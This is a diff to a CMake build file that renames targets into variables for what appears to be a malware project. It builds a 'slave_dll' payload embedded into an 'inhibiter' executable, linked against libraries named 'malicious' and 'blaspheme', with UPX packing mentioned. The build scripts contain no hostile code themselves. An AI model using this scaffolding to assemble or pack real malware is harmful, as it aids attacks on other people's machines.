@@ -1,22 +1,26 @@
+set(SLAVE_DLL_TARGET "slave_dll")
+
 file(GLOB_RECURSE slave_dll_source_files dll/*)
-add_library(slave_dll SHARED ${slave_dll_source_files})
-set_target_properties(slave_dll PROPERTIES COMPILE_FLAGS ${BUILD_FLAGS_MT})
-target_link_libraries(slave_dll system network blaspheme malicious common userenv)
+add_library(${SLAVE_DLL_TARGET} SHARED ${slave_dll_source_files})
+set_target_properties(${SLAVE_DLL_TARGET} PROPERTIES COMPILE_FLAGS ${BUILD_FLAGS_MT} COMPILE_DEFINITIONS "-DPROJECT_MODULE=${SLAVE_DLL_TARGET}")
+target_link_libraries(${SLAVE_DLL_TARGET} system network blaspheme malicious common userenv)
 
 add_custom_command(
-	TARGET slave_dll
+	TARGET ${SLAVE_DLL_TARGET}
 	POST_BUILD
 	COMMAND "${BINGENERATOR}" "${SLAVE_DLL_PATH}" "${SLAVE_DLL_HPP_PATH}" "SlaveDll"
 	COMMENT "Generating ${SLAVE_DLL_HPP_PATH} WITH ${SLAVE_DLL_PATH}"
 )
 
+set(INHIBITER_TARGET "inhibiter")
+
 file(GLOB_RECURSE inhibiter_source_files inhibiter/*)
-add_executable(inhibiter WIN32 ${inhibiter_source_files})
-set_target_properties(inhibiter PROPERTIES COMPILE_FLAGS ${BUILD_FLAGS_MT})
+add_executable(${INHIBITER_TARGET} WIN32 ${inhibiter_source_files})
+set_target_properties(${INHIBITER_TARGET} PROPERTIES COMPILE_FLAGS ${BUILD_FLAGS_MT} COMPILE_DEFINITIONS "-DPROJECT_MODULE=${INHIBITER_TARGET}")
 
 # substrate has to be built before inhibiter, because of resource inclusion
-target_link_libraries(inhibiter common malicious system network slave_dll shlwapi)
-install(TARGETS inhibiter RUNTIME DESTINATION innocence)
+target_link_libraries(${INHIBITER_TARGET} common malicious system network slave_dll shlwapi)
+# install(TARGETS ${INHIBITER_TARGET} RUNTIME DESTINATION innocence)
 
 # UPX Compression
 #if ( CMAKE_BUILD_TYPE MATCHES Debug)
